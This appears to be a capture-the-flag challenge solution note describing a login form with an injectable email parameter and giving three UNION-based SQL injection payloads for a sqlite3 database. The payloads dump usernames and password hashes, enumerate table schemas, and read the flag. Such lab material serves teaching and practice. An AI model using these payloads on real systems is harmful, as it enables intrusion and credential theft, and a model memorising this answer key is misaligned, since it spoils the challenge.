The user will perform a basic SQLI against the email parameter in the login form
this will take them to a admin page, from here they will perform another SQLI to
enumerate the database (sqlite3) and read the flag!

The SQLI needed is a UNION SQLI where you can enumerate the tables used in the db.
`john" UNION SELECT id, username, password, 'x', 'x', 'x', 'x' FROM users -- ` --> shows username and hash from login form
`john" UNION SELECT NULL, name, sql, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table' -- ` --> SQL table enum (shows cols)
`john" UNION SELECT NULL, flag, NULL, NULL, NULL, NULL, NULL FROM secrets -- ` --> gives you the flag
